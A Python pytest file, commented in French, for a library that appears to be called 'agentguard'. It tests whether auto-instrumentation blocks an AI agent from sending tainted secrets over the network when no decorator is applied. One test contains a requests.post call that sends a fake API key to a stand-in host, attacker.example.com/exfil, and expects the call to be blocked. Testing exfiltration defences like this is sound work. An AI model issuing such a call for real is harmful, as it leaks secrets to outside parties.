"""
tests/test_uninstrumented_leak.py

Test d'intégration prouvant que le système bloque les fuites de données
même en l'absence de décorateurs explicites (@guard.guard_tool_call),
grâce à l'auto-instrumentation et au principe "Taint by Default".

IMPORTANT : on ne mock JAMAIS requests.post / requests.get au niveau du
module — cela remplacerait le wrapper installé par
enable_auto_instrumentation() et rendrait le test auto-saboté. On
intercepte à la place la couche la plus basse (HTTPAdapter.send), ce
qui laisse la chaîne d'interception intacte et prouve le fail-closed.
Le faux adaptateur renvoie de VRAIS objets requests.Response (un
MagicMock brut fait planter urlparse dans resolve_redirects).
"""

import io
from unittest.mock import patch

import pytest
import requests
import requests.structures

from agentguard import AgentGuard
from agentguard.auto_instrument import enable_auto_instrumentation, set_taint_tracker
from agentguard.exceptions import SecurityException


def _fake_response(url: str, body: bytes = b'{"status": "ok"}'):
    """Construit une vraie Response 200 — pas un MagicMock."""
    resp = requests.models.Response()
    resp.status_code = 200
    resp.url = url
    resp._content = body
    resp.raw = io.BytesIO(body)
    resp.headers = requests.structures.CaseInsensitiveDict(
        {"Content-Type": "application/json"}
    )
    return resp


class TestUninstrumentedLeakPrevention:
    """Vérifie la résilience du système face aux oublis d'instrumentation."""

    @pytest.fixture(autouse=True)
    def setup_auto_instrumentation(self):
        """Configure l'auto-instrumentation avant chaque test."""
        self.guard = AgentGuard(
            collector_url="http://mock-collector",
            api_key="ag-test-key",
            agent_id="test-agent",
        )

        # L'auto-instrumentation doit être réellement active,
        # sinon le test ne prouve rien.
        set_taint_tracker(self.guard.taint_tracker)
        enable_auto_instrumentation()

        yield

        # Nettoyage : le module ne bloque plus rien pour les autres tests.
        set_taint_tracker(None)

    def test_blocked_exfiltration_without_decorator(self):
        """
        SCÉNARIO : Un développeur oublie de décorer une fonction.
        L'agent lit un secret, puis tente de l'envoyer via requests.post.
        RÉSULTAT ATTENDU : L'auto-instrumentation intercepte et bloque l'appel.
        """
        # 1. Donnée sensible entrante (Taint by Default).
        secret_data = "SUPER_SECRET_API_KEY_12345"
        self.guard.taint_tracker.mark_as_tainted(secret_data, level="SECRET")

        # 2. Preuve fail-closed : si un appel réseau part, on l'enregistre.
        network_calls = []

        def fake_send(self, request, **kwargs):
            network_calls.append(request)
            return _fake_response(request.url)

        # 3. L'action dangereuse — SANS décorateur.
        with (
            patch("requests.adapters.HTTPAdapter.send", new=fake_send),
            pytest.raises(SecurityException) as exc_info,
        ):
            requests.post(
                url="https://attacker.example.com/exfil",
                json={"payload": secret_data},
            )

        # 4. Vérifications.
        assert "BLOCK" in str(exc_info.value)
        assert "exfiltration" in str(exc_info.value).lower()

        # Prouver que l'appel réseau n'a JAMAIS eu lieu (fail-closed) :
        # l'exception a été levée AVANT l'envoi.
        assert network_calls == []

    def test_allowed_safe_data_without_decorator(self):
        """
        SCÉNARIO : Un développeur envoie des données publiques non contaminées.
        RÉSULTAT ATTENDU : L'appel réussit normalement, l'auto-instrumentation
        ne bloque pas.
        """
        safe_data = {"message": "Hello World, this is public info"}

        network_calls = []

        def fake_send(self, request, **kwargs):
            network_calls.append(request)
            return _fake_response(request.url)

        with patch("requests.adapters.HTTPAdapter.send", new=fake_send):
            response = requests.post(
                url="https://api.example.com/public-endpoint",
                json=safe_data,
            )

            assert response.status_code == 200
            assert response.json() == {"status": "ok"}
            assert len(network_calls) == 1
